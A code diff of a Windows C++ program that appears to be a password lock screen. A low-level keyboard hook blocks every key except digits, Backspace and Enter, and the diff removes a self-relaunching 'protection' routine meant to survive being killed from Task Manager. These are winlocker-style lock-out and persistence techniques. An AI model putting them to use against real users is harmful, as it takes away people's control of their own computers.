@@ -1,8 +1,5 @@
 #include <windows.h>
 #include <string>
-#include <vector>
-#include <shlobj.h>
-#include <tlhelp32.h>
 
 const std::wstring PASSWORD = L"29042011";
 std::wstring input_text = L"";
@@ -32,13 +29,12 @@ size_t typed_chars = 0;
 
 HHOOK hKeyboardHook;
 
-// ЖЕСТКАЯ БЛОКИРОВКА КЛАВИШ
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
         DWORD vk = p->vkCode;
 
-        // Разрешаем ТОЛЬКО цифры (0-9), Backspace, Enter и цифры на Numpad
+        // Пропускаем ТОЛЬКО цифры, Backspace и Enter
         if ((vk >= '0' && vk <= '9') || 
             (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) || 
             vk == VK_BACK || 
@@ -46,25 +42,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
         }
 
-        // Блокируем ВСЁ остальное (буквы, Win, Alt, Ctrl, Tab, Esc, F1-F12 и т.д.)
+        // Всё остальное глушим
         return 1; 
     }
     return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
-}
-
-// Функция для перезапуска процесса (защита от убийства через диспетчер задач)
-void ProtectProcess() {
-    wchar_t selfPath[MAX_PATH];
-    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
-    
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-    
-    // Запускаем копию себя
-    if (CreateProcessW(selfPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
@@ -80,7 +61,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         }
         start_time = GetTickCount();
         last_timer_tick = GetTickCount();
-        ProtectProcess(); // Запускаем защиту
         return 0;
 
     case WM_ERASEBKGND:
@@ -113,11 +93,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             show_error = false;
             InvalidateRect(hwnd, NULL, FALSE);
         }
-
-        // Проверка: если основной процесс пытаются закрыть, перезапускаем его
-        if (GetTickCount() % 2000 == 0) {
-            ProtectProcess();
-        }
         return 0;
 
     case WM_CHAR:
@@ -133,7 +108,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
                     error_time = GetTickCount();
                 }
             } else if (wp >= '0' && wp <= '9') {
-                // Записываем только цифры
                 if (input_text.length() < 15) {
                     input_text += (wchar_t)wp;
                 }
